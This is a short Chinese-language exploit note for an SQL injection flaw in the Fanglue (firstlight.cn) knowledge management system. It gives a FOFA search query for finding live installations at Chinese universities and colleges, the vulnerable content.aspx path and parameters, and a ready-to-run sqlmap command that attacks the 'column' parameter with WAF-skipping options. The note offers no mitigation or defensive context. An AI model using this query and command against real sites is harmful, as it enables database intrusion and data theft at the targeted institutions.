---
title: 方略知识管理系统SQL注入
---

# 方略知识管理系统SQL注入

## FOFA

```
host="firstlight.cn" && country="CN" && (title="大学" || title="学院")
```

## 漏洞地址

验证是否存在无限制访问，访问路径

```
/Customer/content.aspx?column=&kind=&wd=111&kkk=1&kf=1&field=1
```

## 漏洞POC

```
python3 sqlmap.py -u "http://xxxx.firstlight.cn/Customer/content.aspx?column=&kind=&wd=111&kkk=1&kf=1&field=1" -p "column" --random-agent --batch --no-cast -skip-waf
```

![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/image-20240624190455747.png)
